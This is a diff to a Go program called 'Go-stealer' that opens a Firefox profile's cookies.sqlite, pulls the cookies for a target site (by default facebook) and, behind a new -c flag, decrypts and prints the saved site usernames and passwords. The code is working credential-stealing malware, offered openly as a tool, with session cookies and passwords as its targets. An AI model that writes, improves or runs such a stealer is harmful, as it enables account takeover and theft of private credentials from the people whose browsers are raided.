@@ -92,14 +92,38 @@ func main(){
 	var cookies []Cookie
 	profilePath := getActiveProfilePath()
 	cookiesPath := profilePath + "\\cookies.sqlite"
-	host := flag.String("host", "facebook", "specific host to look for")
+	fs := flag.NewFlagSet("Go-stealer", flag.ExitOnError)
+	fs.Usage = func() {
+		fmt.Fprintf(os.Stderr, "Usage: go-stealer.exe [OPTIONS]\n")
+		fs.PrintDefaults()
+	}
+
+	var help bool
+	var host string
+	var check bool
+	fs.BoolVar(&help, "h", false, "display this help message")
+
+	fs.StringVar(&host, "web", "facebook", "Specific web url to look for in cookies")
+	fs.StringVar(&host, "w", "facebook", "Shorthand for web option")
+	fs.BoolVar(&check, "check-credentials", false, "Check local credential files and try to decrypt it.")
+	fs.BoolVar(&check, "c", false, "Shorthand for check-credential option")
+	err := fs.Parse(os.Args[1:])
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "%v\n", err)
+		os.Exit(1)
+	}
+
+	if help {
+		fs.Usage()
+		os.Exit(0)
+	}
 	fmt.Println("Opening SQL File")
 	db, err := sql.Open("sqlite3", cookiesPath)
 	if err != nil {
 		log.Fatal(err)
 	}
 	defer db.Close()
-	rows, err := db.Query("select id, name, value, host from moz_cookies where host like '%" + *host + "%'")
+	rows, err := db.Query("select id, name, value, host from moz_cookies where host like '%" + host + "%'")
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -123,8 +147,10 @@ func main(){
 	for _, cookie := range(cookies){
 		fmt.Println(cookie)
 	}
-	creds := crackCredentials(profilePath)
-	for _, cred := range creds{
-		fmt.Printf("Site: %s \nUsername: %s\nPassword: %s\n\n", cred.host, cred.username, cred.password)
+	if check{
+		creds := crackCredentials(profilePath)
+		for _, cred := range creds{
+			fmt.Printf("Site: %s \nUsername: %s\nPassword: %s\n\n", cred.host, cred.username, cred.password)
+		}
 	}
 }
